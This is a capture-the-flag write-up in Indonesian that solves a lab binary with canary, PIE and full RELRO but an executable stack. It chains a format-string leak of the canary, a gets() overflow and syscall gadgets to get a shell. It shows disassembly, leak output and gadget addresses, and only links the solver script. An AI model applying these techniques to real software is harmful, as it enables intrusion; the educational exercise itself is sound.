# CanShell?

## note
chall ini buatan claude AI. namun sangat menantang untuk melatih kemampuan binary exploitation karena banyak proteksi yang diaktifkan. tidak ada fungsi win disini jadi target exploit
adalah mendapatkan shell melalui syscall memanfaatkan semua kerentanan yang ada.

___
## vulnerable :
- format string
- buffer overflow
- stack executable
___

# analysis
analysis metadata file binary dengan file dan memeriksa proteksi nya.

<p align="center"><img width="1919" height="437" alt="image" src="https://github.com/user-attachments/assets/c276a575-3661-4203-8b43-17aa26bf8c20" /></p>

sekilas, file ini memiliki proteksi yang cukup kuat, PIE aktif, CANARY juga aktif dan FULL RELRO. namun terdapat satu proteksi yang tidak diaktifkan yaitu NX sehingga program 
menjadi dapat mengeksekusi apapun yang ada di stack.

aku coba jalankan programnya untuk melihat apa yang program ini lakukan

<p align="center"><img width="860" height="407" alt="image" src="https://github.com/user-attachments/assets/0cd32597-0c3b-45bf-a7af-e131bb3d287a" /></p>

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(try2)
└>  ./vuln

=====================================
        Layanan curhat gratis
=====================================
kenalan dulu, siapa namamu ? : hacker
hacker
sini cerita dulu : aku suka shinobu
oh gitu, apalah.
┌[rotalactf]-[LAPTOP-6QMID52F]-(try2)
└>  ./vuln

=====================================
        Layanan curhat gratis
=====================================
kenalan dulu, siapa namamu ? : %p
0xa70
sini cerita dulu : %p
oh gitu, apalah.
```

program ini menyediakan layanan curhat gratis. input pertama menanyakan nama dan input ke dua menyuruh ku cerita. karena program menulis ulang namaku artinya program menggunakan
fungsi pencetak seperti printf, atau sebagainya.  

aku coba masukkan `%p` untuk mengecek apakah ada kerentanan format string dan ternyata memang ada kerentanan itu di input pertama.
good, harusnya dengan ini aku bisa dengan mudah menemukan base address dari program.

selanjutnya aku lanjutkan analysis menggunakan gdb , aku menemukan fungsi fungsi menarik :

- usefulGadgets
- greet
- vulnerable
- main

fungsi main memanggil fungsi greet dan vulnerable. greet hanya melakukan print banner jadi aku skip itu.

pada fungsi vulnerable terdapat kerentanan lain, yaitu buffer overflow. dapat dibuktikan dengan digunakannya fungsi gets pada input ke dua program
```
Dump of assembler code for function vulnerable:
   0x0000000000001261 <+0>:     endbr64
   0x0000000000001265 <+4>:     push   rbp
   0x0000000000001266 <+5>:     mov    rbp,rsp
   0x0000000000001269 <+8>:     sub    rsp,0x70
   -------------[ prolog ]----------------------

   0x0000000000001297 <+54>:    lea    rax,[rbp-0x70]
   0x000000000000129b <+58>:    mov    esi,0x1f
   0x00000000000012a0 <+63>:    mov    rdi,rax
   0x00000000000012a3 <+66>:    call   0x10e0 <fgets@plt>
   ----------------[ input pertama (nama) ]-------------

   0x00000000000012dc <+123>:   lea    rax,[rbp-0x50]
   0x00000000000012e0 <+127>:   mov    rdi,rax
   0x00000000000012e3 <+130>:   mov    eax,0x0
   0x00000000000012e8 <+135>:   call   0x10f0 <gets@plt>
   -----------[ input kedua (cerita curhat) ]-----------------
```

gets dapat memicu kerentanan buffer overflow karena ia tidak membatasi input sama sekali. 

ukuran buffer di stack adalah `0x70`, sedangkan input cerita disimpan di offset `rbp-0x50`. Artinya jarak input cerita dengan rbp adalah sejauh `0x50` byte


fungsi terakhir adalah usefulGadgets, sepertinya disini banyak sekali instruksi yang berguna untuk exploit nanti.
```
Dump of assembler code for function usefulGadgets:
   0x0000000000001209 <+0>:     endbr64
   0x000000000000120d <+4>:     push   rbp
   0x000000000000120e <+5>:     mov    rbp,rsp
   0x0000000000001211 <+8>:     pop    rdi
   0x0000000000001212 <+9>:     ret
   0x0000000000001213 <+10>:    pop    rsi
   0x0000000000001214 <+11>:    pop    r15
   0x0000000000001216 <+13>:    ret
   0x0000000000001217 <+14>:    pop    rdx
   0x0000000000001218 <+15>:    ret
   0x0000000000001219 <+16>:    pop    rax
   0x000000000000121a <+17>:    ret
   0x000000000000121b <+18>:    pop    rbp
   0x000000000000121c <+19>:    ret
   0x000000000000121d <+20>:    syscall
   0x000000000000121f <+22>:    ret
   0x0000000000001220 <+23>:    jmp    rsp
   0x0000000000001222 <+25>:    xchg   rsp,rax
   0x0000000000001224 <+27>:    ret
   0x0000000000001225 <+28>:    ret
   0x0000000000001226 <+29>:    nop
   0x0000000000001227 <+30>:    pop    rbp
   0x0000000000001228 <+31>:    ret
End of assembler dump.
```
dan yang paling keren adalah ada instruksi syscall : `0x000000000000121d <+20>:    syscall` .aku bisa memanggil shell menggunakan ini.


## data yang berhasil dikumpulkan : 
- kerentanan : executable stack, format string, buffer overflow
- tiitk vuln dan jarak input ke saved rbp : input kedua , sejauh 0x50 byte
- alamat syscall dan gadgets lain

## rencana exploit
- leak address dan value canary menggunakan format string
- mengisi stack dengan instruksi syscall pemanggil shell
- buat payload untuk memaksa program melompat ke stack

___
# exploit 
menggunakan tools SeeIn aku menemukan canary dan fungsi main ada di index ke 19 & 27 :
```C
─────────────────────────────────────────────────────────[ LEAKED ]─────────────────────────────────────────────────────────
     TIPE        INDEX               ADDRESS             STRING

  start idx      6              0x253a702435254444     b'%:p$5%DD'
  canary         19             0xa98e9ed973397000
  est. main      27             0x6534d5aba304          0x1304 (main)
```

good , selanjutnya adalah mencari alamat gadget tadi. sebenarnya bisa sih pakai hasil gdb tadi , tapi aku lebih suka cari alamat pastinya pakai tools `ROPgadget`

```
└> ROPgadget --binary ./vuln | grep pop
0x0000000000001214 : pop r15 ; ret
0x0000000000001219 : pop rax ; ret
0x00000000000011f3 : pop rbp ; ret
0x0000000000001211 : pop rdi ; ret
0x0000000000001217 : pop rdx ; ret
0x0000000000001213 : pop rsi ; pop r15 ; ret

└> ROPgadget --binary ./vuln | grep ret
0x000000000000101a : ret
```

sekarang aku tinggal menyusun skrip dengan python.

berikut [skripnya](solver.py)

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(try2)
└> python3 solver.py
sini cerita dulu : $ ls
SeeIn_v0.3.py  flag.txt  solver.py  source.c  vuln
$ cat flag.txt
THPCTF{r3t25yc5c4ll_3x3cv3_w1th_c4n4ry_byp455}
```

done with flag : `THPCTF{r3t25yc5c4ll_3x3cv3_w1th_c4n4ry_byp455}`

